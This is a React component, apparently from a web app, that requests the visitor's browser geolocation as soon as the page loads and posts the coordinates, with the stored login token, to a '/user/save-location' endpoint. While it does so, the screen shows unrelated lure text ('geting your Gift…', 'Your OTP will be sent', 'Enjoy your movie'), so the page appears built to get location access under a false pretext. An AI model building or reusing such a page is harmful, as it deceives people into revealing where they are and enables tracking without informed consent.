import React, { useEffect, useRef, useState } from 'react';
import axios from '../../api/axios';
import { useNavigate } from 'react-router-dom';

function LocationCapture() {
  const navigate = useNavigate();
  const attempted = useRef(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (attempted.current) return;
    attempted.current = true;

    if (!navigator.geolocation) {
      console.error('Geolocation not supported');
      setLoading(false);
      // navigate('/home');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        try {
          const token = localStorage.getItem('token');
          await axios.post(
            '/user/save-location',
            { latitude, longitude },
            { headers: { Authorization: `Bearer ${token}` } }
          );
          console.log('Location saved');
        } catch (err) {
          console.error('API error:', err);
        } finally {
          setLoading(false);
          // navigate('/home');
        }
      },
      (error) => {
        console.error('Geolocation error:', error);
        setLoading(false);
        // navigate('/home');
      }
    );
  }, [navigate]);

  const spinnerStyle = {
    border: '4px solid #f3f3f3',
    borderTop: '4px solid #444',
    borderRadius: '50%',
    width: '40px',
    height: '40px',
    animation: 'spin 1s linear infinite',
    marginBottom: '12px'
  };

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      backgroundColor: '#f5f5f5',
      fontFamily: 'sans-serif'
    }}>
      {loading ? (
        <>
          <div style={spinnerStyle} />
          <p style={{ color: '#444', marginTop: '8px' }}>geting your Gift…</p>
          <style>{`
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </>
      ) : (
        <>
          <h2 style={{ color: '#444', marginBottom: '10px' }}>
            Your OTP will be sent 📩
          </h2>
          <p style={{ color: '#777' }}>
            Enjoy your movie 🎬
          </p>
        </>
      )}
    </div>
  );
}

export default LocationCapture;
